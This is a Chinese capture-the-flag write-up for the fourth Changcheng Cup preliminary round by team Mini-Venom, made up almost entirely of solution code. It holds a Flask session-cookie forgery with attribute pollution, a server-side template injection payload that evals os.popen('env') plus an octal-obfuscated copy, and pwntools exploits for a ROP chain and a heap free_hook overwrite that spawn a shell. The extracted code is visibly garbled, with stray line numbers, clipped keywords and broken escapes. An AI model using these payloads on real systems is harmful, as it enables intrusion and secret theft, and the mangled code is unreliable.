# 第四届“长城杯”网络安全大赛暨京津冀网络安全技能竞赛（初赛）by Mini-Venom

> 原文: https://www.ctfiot.com/204445.html
> ID: 204445

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
cat oa.access.log|awk '{print $1}'|uniq -c|sort -nr
from hashlib import md5

c = '''8fa14cdd754f91cc6554c9e71929cce7
2db95e8e1a9267b7a1188556b2013b33
0cc175b9c0f1b6a831c399e269772661
b2f5ff47436671b6e533d8dc3614845d
f95b70fdc3088560732a5ac135644506
b9ece18c950afbfa6b0fdbfa4ff731d3
2510c39011c5be704182423e3a695e91
e1671797c52e15f763380b45e841ec32
b14a7b8059d9c055954c92674ce60032
6f8f57715090da2632453988d9a1501b
cfcd208495d565ef66e7dff9f98764da
03c7c0ace395d80182db07ae2c30f034
e358efa489f58062f10dd7316b65649e
b14a7b8059d9c055954c92674ce60032
c81e728d9d4c2f636f067f89cc14862c
e1671797c52e15f763380b45e841ec32
4a8a08f09d37b73795649038408b5f33
4c614360da93c0a041b22e537de151eb
4b43b0aee35624cd95b910189b3dc231
e1671797c52e15f763380b45e841ec32
b14a7b8059d9c055954c92674ce60032
e1671797c52e15f763380b45e841ec32
8d9c307cb7f3c4a32822a51922d1ceaa
4a8a08f09d37b73795649038408b5f33
4b43b0aee35624cd95b910189b3dc231
57cec4137b614c87cb4e24a3d003a3e0
83878c91171338902e0fe0fb97a8c47a
e358efa489f58062f10dd7316b65649e
865c0c0b4ab0e063e5caa3387c1a8741
d95679752134a2d9eb61dbd7b91c4bcc
7b8b965ad4bca0e41ab51de7b31363a1
9033e0e305f247c0c3c80d0c7848c8b3
cbb184dd8e05c9709e5dcaedaa0495cf ' ' ' .split('n ') 
s = list(range(32,127))
t = {}

for k in s :
    t[md5(chr(k) .encode()) .hexdigest()] = chr(k)
flag= ' '
for k in c :
    flag += t[k] 48
print(flag)
Hint:<!-- The developer likes to use fuzzy matching in the login module. -->
python .flask_session_cookie_manager3.py decode -s "a123456" -c ".eJwNy8EKgCAMANB_2blDNE3tZ2JtMyQySD1E9O95ffBe4HLHtV6HZliAMUQevbcyErlp04h21iBCQSbrLKJBMuxggCSaa6pPX3vTUju1onemUzuRnCnD9wOMFB3q.Zt1QjQ.OTtQdF_Cpv1tSr2nRVze_HVtck8"

{'csrf_token': 'c39fc0885d0aa72bef356e9dda9d25753343a4c7', 'identity':'guest', 'username': 'admin'}
python .flask_session_cookie_manager3.py encode -s "a123456" -t " {'csrf_token': '94c60c3656b0b0e1f9875b5007a36bdb8c99a4c2', 'identity':'admin', 'username': 'admin','__init__':{'__globals__':{'sold':
600}}}"

.eJxNi0EKwyAQAP-y5x42TTTRz8iumiA1K0R7KMG_Vilt5mBucHXa3etvKKABbN4jX7WSjMyxmk326pYIa40aw68eWNo8U94QApRWmqfcVE4k4z0rvESOuNfci5Jas6BvQcfuTDl-tNacgCrEXvvXwr9KtA.Zt1Rqw.ccWGXf3_b2qaTKmJKf1O7VZKJdg
python .flask_session_cookie_manager3.py encode -s "a123456" -t "{'csrf_token': '94c60c3656b0b0e1f9875b5007a36bdb8c99a4c2', 'identity':'admin', 'username': 'admin','__init__':{'__globals__':{'inventory':'{{7*7}}'}}}"

.eJxNjEEKwyAQRe8yy9KFbaLGXEYcNWVoMoKaQhHvXks33f3_4L0GvuTN1vSMDCuY2SvhJyUVCh
TxtplFS5RCaDcpDLh4Y9zs73AFCpEr1fewXDiIBzpLzOyOIesJaZqLaxt7Mee0O3ld4lfo5Dyt9CavujeoffAQLkL0I.Zt1SVw.Y8voG3JvYxRwEznVxh_B1j2Pj4M
{{''.__class__().__bases__[0]['__subclasses__'][133]['__init__']
['__globals__']['__builtins__']['eval']
('__import__("os").popen("env").read()')}}

这是以上命令转换的8进制形式
{{''['\137\137\143\154\141\163\163\137\137']
['\137\137\142\141\163\145\163\137\137'][0]
['\137\137\163\165\142\143\154\141\163\163\145\163\137\137'
]()[133]['\137\137\151\156\151\164\137\137']
['\137\137\147\154\157\142\141\154\163\137\137']
['\137\137\142\165\151\154\164\151\156\163\137\137']
['\145\166\141\154']
('137\137\151\155\160\157\162\164\137\137\050\042\157\163\04
2\051\056\160\157\160\145\156\050\042\042\051\056\162\145\14
1\144\050\051')}}
int __fastcall main(int argc, const char **argv, const char **envp)
{
const __m128i *v3; // rcx
unsigned __int64 v4; // r8
__int64 i; // r10
__int64 v6; // rax
if ( argc <= 1 )
  exit(0);
v3 = (const __m128i *)argv[1];
v4 = 1LL;
for ( i = 0LL; i != 43; ++i )
{
  v3->m128i_i8[i] ^= v3->m128i_u8[i + 1 + -42 * (v4 / 0x2A)];
  ++v4;
  }
  if ( _mm_movemask_epi8(
    _mm_and_si128(
    _mm_cmpeq_epi8(_mm_loadu_si128(v3), (__m128i)xmmword_140021410),
    _mm_cmpeq_epi8(_mm_loadu_si128(v3 + 1),
    (__m128i)xmmword_140021400))) == 0xFFFF )
    {
      v6 = sub_1400011A0(&qword_1400312E0, "flag is your input", v4,
      0xC30C30C30C30C30DuLL);
      sub_1400015A0(v6);
  }
  return 0;
}
    #include 
    #include <vector>
int main() {
  std::
vector encoded = { 0x0A, 0x0D, 0x06, 0x1C, 0x1D,
  0x05, 0x05, 0x5F, 0x0D, 0x03,
  0x04, 0x0A, 0x14, 0x49, 0x05,
  0x57, 0x00, 0x1B, 0x19, 0x02,
  0x01, 0x54, 0x4E, 0x4C, 0x56,
  0x00, 0x51, 0x4B, 0x4F, 0x57,
  0x05, 0x54, 0x55, 0x03, 0x53,
  0x57, 0x01, 0x03, 0x07, 0x04,
  0x4A, 0x77, 0x0D };
  std::
vector xorIndices;
  int stepCounter = 1;
  for (int i = 0; i < encoded.size(); i++) {
    int index = i + 1 - 42 * (stepCounter / 42);
    xorIndices.push_back(index);
    stepCounter++;
  }
  int currentIndex = encoded.size() - 1;
  for (int i = encoded.size() - 1; i >= 0; i--) {
    encoded[i] ^= encoded[xorIndices[currentIndex]];
    currentIndex--;
  }
  for (auto byte : encoded) {
    std::
cout << byte;
  }
  std::
cout << std::
endl;
  return 0;
}
from Crypto .Util.number import *
from sympy.ntheory.residue_ntheory import nthroot_mod 3
p =170302223332374952785269454020752010235000449292324018706323228421794605831609342383813680059406887437726391567716617403068082252456126724116360291722050578106527815908837796377811535800753042840119867579793401648981916062128752925574017615120362457848369672169913701701169754804744410516724429370808383640129
a =
9564739801699899432323273720617188889995718735702793998290996540708638333941
8183844601496450055752805846840966207033179756334909869395071918100649183599
0566956887022721132801269994395740177284763673076735247624937715761559498664
4231761630683225293103893223234239640662332496747995977075175655123864738519
1314
b =
1228915043358335881480266406788122835155330675725142493551058633674135562428
7668624962848851247939979511768864197327247088432387362114323462835100600239
8994272892177228185516130875243250912554684234982558913267007466946601210297
1765418612799029308608512197326969734120966035484677201047278879073694707589
01838
n =
5593134172275186875590245131682192688778392004699750710462210806902340747682
3784002266056480118160399482620080660666506570069557031369286620679312120334
7283806705042962439591977175794964051708503695862328018813396515028541060947
5158882527926240531113060812228408346482328419754802280082212250908375099979
0583074377512294217086153414862214245961281375750429349289226158329872027626
5190405693429268202196329027114447344699495897548798014632969797048431186352
4622696562094720833240915154181032649358743041246023013296745195478603299127
0941034486980603676481929057298668970742346818442525499345318931727093014119
95941527
c =
2185680728108057860427602387168654320024588536620246138642042133525937248576
8505747163249942220272515487436632861257699883606773277132819740755746569059
1664374684281925189923326670613826725044183213306866127718750742778734389786
3339824140927640373352305007520681800240743854093190786046280731148485148774
1884486586632507310767397378012677026824632656637259006213756896844598945441
6987987334400381030749616285831857483048748036041989745389205345699343645278
3099460908947258094434884954726862549670168954554640433833484822078996925040
3103166094258053511831656688931991379111450576396577099367628662086355823489
32189646
e = 65537

for k1 in range(1000) :
    for k2 in range(1000) :
         A = a
         B = b + k2 + k1 * a
         C = k1 * (b + k2) - n
         # Ax^2 + Bx + C - n = 0
         # 求根公式
        delta = nthroot_mod(B**2 - 4 * A * C,2,p)
         p1 = (-B + delta) * inverse(2 * A, p) % p + k1
         p2 = (-B - delta) * inverse(2 * A, p) % p + k1
         if n % p1 == 0 :
             p = p1
             q = n // p
             d = inverse(e, (p - 1) * (q - 1))
            print(long_to_bytes(pow(c, d, n)))
         elif n % p2 == 0 :
             p = p2
             q = n // p
             d = inverse(e, (p - 1) * (q - 1))
            print(long_to_bytes(pow(c, d, n)))
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
p=process('./pwn')
elf=ELF('./pwn')
bin_sh=0x601840
pay=b'x00'*52+b'pwnx00'+b'xffxffxffxff'
p.send(pay)
p.sendline(b'a')
p.sendline(b'c')
p.sendline(str(1))
p.sendline(b'a')
p.sendline(str(1))
p.sendline(b'a')
p.sendline(str(1))
p.sendline(b'b')
rdi=0x0000000000400f13
payload=b'a'*0x18+p64(rdi)+p64(bin_sh)+p64(rdi+1)+p64(0x400730)
p.send(payload)
p.sendline(str(1))
p.interactive()
from pwn import *
mport json
rom struct import pack
rom ctypes import *
mport base64
from LibcSearcher import * 7
def debug(c = 0) :
   if(c) :
        gdb.attach(p, c)
    else :
         gdb.attach(p)
         pause()
def get_sb() : return libc_base + libc .sym [ 'system '], libc_base + next(libc .search(b'/bin/shx00 '))
#--------------------------------------------------------------------------

s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :
print(p.recv(num))
inter   = lambda         :p.interactive()
l32 = lambda    :
u32(p.recvuntil(b'xf7 ') [-4:] .ljust(4,b'x00 '))
l64 = lambda    :
u64(p.recvuntil(b'x7f') [-6:] .ljust(8,b'x00 '))
uu32    = lambda    :
u32(p.recv(4) .ljust(4,b'x00 '))
uu64    = lambda    :
u64(p.recv(6) .ljust(8,b'x00 '))
int16   = lambda data   :
int(data,16)
lg= lambda s, num   :p.success( '%s -> 0x%x ' % (s, num))
#--------------------------------------------------------------------------
context(os= 'linux ', arch= 'amd64 ', log_level= 'debug ')
p=remote("IP",PORT)
elf = ELF( ' ./Heap ')
libc = ELF( ' ./libc-2 .31-0kylin9 .2k0 .2 .so ') 36
def add(size,content) :
        sla(b 'What will you do, adventurer? ',b'1 ')
        sla(b 'Enter the size of the block you wish to summon (1 to 1280 bytes) : ',str(size))
        sla(b'bytes) :n ',content) 41

def free(idx) :
        sla(b 'What will you do, adventurer? ',b'2 ')
         sla(b 'index (0-19) : ',str(idx)) 46
def edit(idx,content) :
        sla(b 'What will you do, adventurer? ',b'3 ')
         sla(b 'index (0-19) : ',str(idx))
        sla(b'bytes) :n ',content) 51
def show(idx) :
        sla(b 'What will you do, adventurer? ',b'4 ')
         sla(b 'index (0-19) : ',str(idx)) 55
add(0x460,b'a '*0x10)
add(0x20,b'a '*8)
free(0)
show(0)
p.recvline()
libc_base=u64(p.recv(6) .ljust(8,b'x00 ')) 62
free_hook=libc_base+0x2f48
malloc_hook=libc_base-0x70
for i in range(9) :
        add(0x68,b'a '*1)
for i in range(9) :
        free(i+1)
system=libc_base-0x1967d0
edit(9,p64(free_hook-0x10))
for i in range(7) :
        add(0x68,b'a '*8)
add(0x68,b'/bin/shx00 '*1)
add(0x68,b'/bin/shx00 '*1)
edit(19,p64(system))
print(hex(libc_base))
free(18)
p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/9-1725928410.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/4-1725928411.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/3-1725928412.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/2-1725928412.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/7-1725928413.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/4-1725928414.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/7-1725928414.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/6-1725928415.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/2-1725928415.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/5-1725928416.png)